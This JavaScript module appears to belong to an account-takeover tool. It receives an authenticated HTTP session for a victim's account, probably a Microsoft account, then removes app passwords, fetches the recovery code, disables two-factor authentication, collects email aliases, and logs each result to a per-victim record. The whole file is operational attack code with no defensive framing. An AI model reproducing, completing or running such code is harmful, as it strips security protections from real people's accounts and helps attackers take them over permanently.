const disableTfa = require("../disableTfa");
const { updateExtraInformation, updateStatus } = require("../../process/helpers");
const aliasses = require("../../sections/aliasses");
const getAliases = require("../../secure/getAliases");
const getogo = require("../../secure/getogo");
const recoveryCode = require("../../secure/recoveryCode");
const removepw = require("../../secure/removepw");
const securityInformation = require("../../secure/securityInformation");

async function getsecuredata(axios, uid, apiCanary, obj) {
  let securedata = {
    aliases: [],
    email: null,
    canary: null,
    disabledtfa: false, 
    netid: null, // get recovery using this
    recovery: null,
    security: null, /// Only for insert.
    securityparams: null
  };

  /*
  Get Security (Remove app passwords if needed) & Aliasses & Recovery & Disable TFA
  */

  let securityParameters = await securityInformation(axios);
  if (!securityParameters) securityParameters = await securityInformation(axios);
  if (!securityParameters) securityParameters = await securityInformation(axios);

  securedata.securityparams = securityParameters

  if (securityParameters?.email) {
    securedata.email = securityParameters.email;
  } else {
    console.log(`Couldn't get email!`);
  }

  if (securityParameters?.netId) {
    securedata.netid = securityParameters.netId;
  } else {
    console.log(`Couldn't get netid`);
  }

  if (securityParameters?.secoptions) {
    securedata.security = securityParameters.secoptions;
    await updateExtraInformation(uid, "security", JSON.stringify(securedata.security));
  }

  if (securityParameters?.apppasswords) {
    console.log(`App passwords detected: ${securityParameters.apppasswords}`);
    try {
      const removed = await removepw(axios);
      if (removed) {
        console.log(`Removed App Passwords successfully!`);
        await updateExtraInformation(uid, "apppasswords", "Removed");
      } else {
        console.log(`Couldn't remove available app passwords`);
        await updateExtraInformation(uid, "apppasswords", "Couldn't remove");
      }
    } catch (e) {
      console.log(`Error removing app passwords:`, e);
      await updateExtraInformation(uid, "apppasswords", "Error removing");
    }
  } else {
    await updateExtraInformation(uid, "apppasswords", "None");
  }

  let promises = [];

  if (securityParameters?.netId) {
    promises.push(
      (async () => {
        let revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);
        if (!revcode) {
          console.log(`Couldn't fetch the recovery code (1st attempt, trying for 2nd)`);
          revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);
        }
        if (!revcode){
          console.log(`Couldn't fetch the recovery code (2st attempt, trying for 3rd)`);
          revcode = await recoveryCode(axios, securityParameters.netId, apiCanary, obj);  
        }
        if (revcode) {
          securedata.recovery = revcode;
        }
      })()
    );
  }

  promises.push(
    (async () => {
      const tfadisabled = await disableTfa(axios);
      if (tfadisabled) {
        securedata.disabledtfa = true;
        console.log('Disabled TFA (if applicable)');
      } else {
        console.log(`Couldn't disable 2FA!`);
      }
    })()
  );

  promises.push(
    (async () => {
      try {
        const result = await getAliases(axios);
        if (result) {
          const [aliases, canary, primary] = result;
          if (aliases && Array.isArray(aliases)) {
            await updateExtraInformation(uid, "oldaliases", JSON.stringify(aliases));
            securedata.aliases = aliases;
          }
          if (canary) {
            securedata.canary = canary;
          }
          if (primary) {
            securedata.email = primary;
          }
        }
      } catch (e) {
        console.error(`getAliases error:`, e);
      }
    })()
  );

  await Promise.all(promises);

  if (!securedata.recovery || securedata.recovery === "") {
    console.log(`Couldn't get the recovery code!`);
  } else {
    await updateStatus(uid, "recoverycode", securedata.recovery);
  }

  if (securedata.email) {
    await updateStatus(uid, "email", securedata.email);
  } else {
    console.log(`Retrying to get email!`);
    try {
      let ogo = await getogo(axios);
      const parsed = JSON.parse(ogo);
      securedata.email = parsed.email;
      await updateStatus(uid, "email", securedata.email);
    } catch (e) {
      console.log(`Failed to fetch email from getogo:`, e);
      await updateStatus(uid, "email", "Couldn't grab");
    }
  }

  return securedata;
}

module.exports = getsecuredata;
